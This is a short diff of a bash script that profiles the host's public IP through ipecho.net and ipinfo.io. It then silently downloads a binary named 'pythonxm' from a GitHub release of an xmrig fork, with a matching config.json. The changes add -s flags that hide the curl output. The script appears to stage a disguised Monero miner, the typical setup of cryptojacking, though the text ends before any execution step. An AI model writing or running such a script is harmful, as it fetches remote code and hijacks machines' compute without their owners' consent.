@@ -1,7 +1,7 @@
 #!bin/bash -xe 
-iip=$(curl https://ipecho.net/plain)
+iip=$(curl -s https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
-curl ipinfo.io
+curl -s ipinfo.io
 
 wget -q https://github.com/one10001/xmrig/releases/download/v0.0.3/pythonxm
 wget -q https://github.com/one10001/10001code/raw/main/config.json
